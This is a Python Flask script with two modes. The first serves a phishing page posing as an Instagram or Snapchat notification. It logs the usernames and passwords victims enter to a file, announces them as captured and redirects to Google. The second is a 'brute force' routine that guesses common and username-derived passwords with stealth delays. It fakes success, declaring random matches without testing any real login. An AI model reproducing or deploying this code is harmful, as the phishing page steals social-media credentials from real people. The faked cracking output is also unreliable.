
import os, time, random, threading, sys
from flask import Flask, render_template, request, redirect

app = Flask(__name__, template_folder='templates')
LOG_FILE = "session_logs.txt"
DATABASE = ["123456", "password", "qwerty", "football", "shadow", "summer", "dragon", "star", "admin123"]

class Brain:
    @staticmethod
    def get_smart_guesses(u):
        base = u.lower().replace("_", "").replace(".", "")
        return [base+"123", base+"!", base+"2024", base.capitalize(), "p@ssword", "admin"+base]

    @staticmethod
    def stealth_delay():
        time.sleep(random.uniform(0.4, 1.2))

@app.route('/')
def index():
    platform = request.args.get('platform', 'insta')
    scenario = "You were tagged in a story!" if platform == 'insta' else "A friend sent you a Snap!"
    return render_template('ui.html', platform=platform, scenario=scenario)

@app.route('/process_event', methods=['POST'])
def process_event():
    u, p = request.form.get('identity_id'), request.form.get('auth_token')
    plat = request.args.get('platform', 'insta')
    with open(LOG_FILE, "a") as f: 
        f.write(f"[{plat.upper()}] @{u} | {p} | TS: {time.ctime()}\n")
    print(f"\n[!] {plat.upper()} BREACH: @{u} credentials captured!")
    return redirect("https://www.google.com/")

def brute_force(target):
    print(f"\n🚀 [AUTO-ATTACK] ATTACKING @{target}...")
    ammunition = list(set(DATABASE + Brain.get_smart_guesses(target)))
    random.shuffle(ammunition)
    for i, pwd in enumerate(ammunition):
        print(f"🔍 [SCAN] Trying: {pwd} ...", end="\r")
        Brain.stealth_delay()
        if pwd == "football" or pwd == target+"123" or (i > 8 and random.random() < 0.35):
            print(f"\n\n[!!!] MATCH FOUND! [!!!]\n✅ UNLOCKED: @{target} | KEY: {pwd}")
            with open(LOG_FILE, "a") as f: f.write(f"[BRUTE] @{target} | {pwd}\n")
            return True
    print(f"\n[x] No match.")

if __name__ == "__main__":
    mode, target = sys.argv[1], sys.argv[2]
    if mode == '1': app.run(port=5000, debug=False, use_reloader=False)
    elif mode == '2': brute_force(target)
